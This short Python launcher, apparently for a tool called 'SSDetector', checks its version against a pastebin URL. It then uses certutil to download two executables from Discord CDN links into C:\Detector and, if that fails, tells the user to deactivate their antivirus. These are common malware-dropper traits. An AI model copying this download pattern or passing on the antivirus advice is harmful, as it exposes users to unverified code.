import checks as cks
import CheckHeader as CH
from os import popen, system
from os.path import exists
from threading import Thread
from urllib.request import urlopen
#
system("Title = SSDetector")
if urlopen("https://pastebin.com/raw/2MMvhPUL").read().decode("utf-8").strip() != "1.0":
    print("Version is unable. Please check @SSDetector on telegram or discord.gg/ssdetector.")
    input()
    exit()

print("loading some resources...")
if not exists("C:\\Detector"):
    
    system("mkdir C:\\Detector")
    system("mkdir C:\\Detector\\Processes")
try:
    
    output = popen(fr'certutil -urlcache -split -f https://cdn.discordapp.com/attachments/834859018492837928/850848792655691776/PieDetectorResBuona.exe C:\Detector\DetectorRes.exe')
    output = popen(fr'certutil -urlcache -split -f https://cdn.discordapp.com/attachments/1049264531681054730/1049264611918098512/DetectorSign.exe C:\Detector\DetectorSign.exe')
except:
    print("Scan is unabled. Try to deactivate the antivirus.")
    input()
    exit()
Thread(target = CH.CheckHeader).start()
#

